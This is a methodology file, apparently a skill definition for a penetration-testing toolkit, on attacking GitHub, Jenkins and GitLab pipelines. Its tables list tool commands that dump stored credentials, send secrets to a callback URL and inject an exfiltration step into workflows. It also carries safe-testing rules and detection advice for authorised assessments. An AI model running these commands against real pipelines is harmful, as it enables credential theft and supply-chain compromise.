---
name: cicd-attacks
description: CI/CD pipeline attacks for secret extraction, pipeline injection, and supply chain compromise via GitHub/Jenkins/GitLab
category: post-exploitation
tags: [cicd, github-actions, jenkins, gitlab, pipeline, supply-chain, secret-extraction, credential-access]
tech_stack: [github, jenkins, gitlab, python, requests]
cwe_ids: [CWE-522, CWE-693, CWE-829, CWE-284]
chains_with: [ci-assessment, T1552.004, T1059, T1098]
prerequisites: [ci-assessment]
version: "1.1.0"
---

# CI/CD Pipeline Attack Methodology

CI/CD pipeline attacks target the software delivery infrastructure to extract secrets, inject malicious code, and establish persistence. After gaining access to GitHub, Jenkins, or GitLab, these tools extract stored credentials, inject pipeline steps for secret exfiltration, and manipulate workflow configurations.

## Prerequisites

1. **CI/CD access** — API token, personal access token, or service account credentials
2. **Python packages** — `pip3 install requests`
3. **API access** — Valid token with appropriate scopes (repo, admin, workflow)

```bash
# Quick prerequisite check — GitHub
curl --max-time 15 --connect-timeout 5 -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user | jq .login

# Quick prerequisite check — Jenkins
curl --max-time 15 --connect-timeout 5 -s -u "$JENKINS_USER:$JENKINS_TOKEN" "$JENKINS_URL/api/json" | jq .nodeDescription

# Quick prerequisite check — GitLab
curl --max-time 15 --connect-timeout 5 -s -H "Private-Token: $GITLAB_TOKEN" "$GITLAB_URL/api/v4/user" | jq .username
```

## Kill Chain Phases

### Phase 1 — Reconnaissance

| Action | Command | Purpose |
|--------|---------|---------|
| List GitHub secrets | `cipipe gh_secrets --repo OWNER/REPO --method list` | Enumerate repository and environment secret names |
| Jenkins credentials | `cipipe jenkins_creds --url URL --method api` | List credential store entries |
| GitLab variables | `cipipe gitlab_tokens --url URL --project-id ID` | Enumerate CI/CD variables and tokens |

### Phase 2 — Secret Extraction

| Action | Command | Purpose |
|--------|---------|---------|
| GitHub dispatch | `cipipe gh_secrets --repo OWNER/REPO --method dispatch --callback-url URL` | Exfiltrate secrets via workflow dispatch |
| Jenkins console | `cipipe jenkins_creds --url URL --method console` | Extract credentials via Groovy Script Console |
| GitHub logs | `cipipe gh_secrets --repo OWNER/REPO --method logs` | Search workflow logs for leaked secrets |

### Phase 3 — Pipeline Injection

| Action | Command | Purpose |
|--------|---------|---------|
| Inject pipeline | `cipipe pipeline_inject --repo OWNER/REPO --callback-url URL` | Add exfiltration step to CI/CD pipeline |

### Phase 4 — Cleanup (MANDATORY)

```
cipipe cleanup_ci
```

## Verification and Safe-Testing Gate

- Confirm repository, workflow, runner, package registry, and cloud identities are in scope before testing. CI/CD workflows can deploy software or expose secrets, so start with read-only configuration review.
- Treat dangerous triggers, untrusted expression interpolation, writable workflow permissions, and exposed secrets as leads. Confirm the actual execution context, permission boundary, and reachable impact before reporting.
- Use a fork or designated test branch with a harmless marker when validating pipeline injection. Do not alter production workflows, publish packages, deploy artifacts, or exfiltrate runner credentials without explicit written authorization.
- For secrets exposure, prove only that a synthetic canary or approved test secret is accessible. Never print or upload real tokens, signing keys, or cloud credentials.
- For supply-chain impact, identify the exact trust boundary (contributor, workflow, runner, artifact, package, or deployment) and what an attacker can actually modify. A misconfiguration alone is not proof of compromise.
- Keep commands read-only by default, use conservative rate limits, and preserve sanitized workflow excerpts, permissions, event context, and timestamps.
## Detection Considerations

- **GitHub Audit Log** — Workflow creation, secret access, branch creation
- **Jenkins Audit Trail Plugin** — Script console access, credential reads
- **GitLab Audit Events** — Variable access, runner token reads, pipeline modifications
- **Branch Protection Rules** — Prevent direct push to main/protected branches
- **Required Reviews** — PR approval requirements block unauthorized workflow changes
- **Secret Scanning** — GitHub/GitLab native scanning for leaked credentials

## Pipeline Attack-Path Verification Matrix

Trace each issue from attacker-controlled input to the workflow permission and resulting action. Review trigger type, actor trust, token permissions, runner persistence, artifact/cache sharing, registry credentials, and deployment gates.

| Surface | Verify | Safe proof |
|---|---|---|
| Workflow triggers | pull_request, workflow_run, issue/comment events | test branch and harmless marker |
| Expression injection | untrusted metadata reaches shell or script context | disposable branch; no secret access |
| Token permissions | effective GITHUB_TOKEN or equivalent scope | read-only permission analysis and test repository |
| Artifacts/cache | trust boundary between untrusted and privileged jobs | synthetic artifact in a test workflow |
| Self-hosted runners | whether untrusted jobs can reach persistent runner state | configuration review or isolated runner |
| Release/deploy | approvals, provenance, signing, environment protection | test artifact; no production deployment |

Do not expose real secrets, publish packages, change production workflows, or deploy artifacts without explicit approval. A dangerous workflow pattern is a lead; document the trigger, attacker-controlled value, execution identity, and concrete reachable impact.

## Program Reference

| Program | Technique | MITRE ATT&CK |
|---------|-----------|---------------|
| gh_secrets | GitHub Actions secret extraction | T1552.004 — Private Keys |
| jenkins_creds | Jenkins credential dump | T1555 — Credentials from Password Stores |
| pipeline_inject | CI/CD pipeline injection | T1195.002 — Compromise Software Supply Chain |
| gitlab_tokens | GitLab CI/CD variable extraction | T1552.004 — Private Keys |
| cleanup_ci | Pipeline modification rollback | T1070 — Indicator Removal |
